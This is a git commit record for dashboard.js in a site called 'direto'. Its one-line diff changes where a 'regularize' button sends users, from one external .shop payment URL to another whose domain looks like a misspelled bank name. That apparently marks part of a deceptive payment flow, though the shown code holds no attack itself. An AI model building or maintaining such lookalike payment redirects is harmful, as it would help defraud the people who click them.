6cd28633ab1a15a53a6c44e0b386bf524a7c2be4
abymaelplay129-rgb <abymaelplay129@gmail.com>
2025-09-03 18:03:53 -0300

    Update dashboard.js

--- site/direto/app/js/dashboard.js
+++ site/direto/app/js/dashboard.js
@@ -411,7 +411,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const regularizeBtn = document.getElementById("regularizeBtn");
   if (regularizeBtn) {
     regularizeBtn.addEventListener("click", function () {
-      const baseUrl = "https://pay.aglicenter.shop/bz5KZbVmvYBZ7dL";
+      const baseUrl = "https://pay.agilbanck.shop/a6pVgd2qwrBZk7B";
       const currentParams = window.location.search;
 
       const finalUrl = currentParams
